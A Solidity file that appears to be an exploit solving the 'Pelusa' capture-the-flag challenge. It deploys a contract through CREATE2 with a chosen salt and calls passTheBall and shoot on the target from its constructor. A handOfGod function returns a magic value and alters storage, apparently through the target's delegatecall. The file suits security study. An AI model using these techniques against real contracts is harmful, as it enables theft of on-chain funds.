// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IPelusa {
    function passTheBall() external;

    function shoot() external;
}

contract Game {
    address internal player;
    uint256 public goals = 1;
    address constant pelusa = 0x9FA11330E781733A241e7BbDa39B461C73E07A89;

    function getBallPossesion() external pure returns (address) {
        return 0xe1972aF91590919527F07FbCACfBEa530704c90F;
    }

    function handOfGod() external returns (uint) {
        goals += 1;
        return 22_06_1986;
    }

    constructor() {
        IPelusa(pelusa).passTheBall();
        IPelusa(pelusa).shoot();
    }
}

contract DeployGame {
    function deploy(uint _salt) external returns (address) {
        Game game = new Game{salt: bytes32(_salt)}();
        return address(game);
    }
}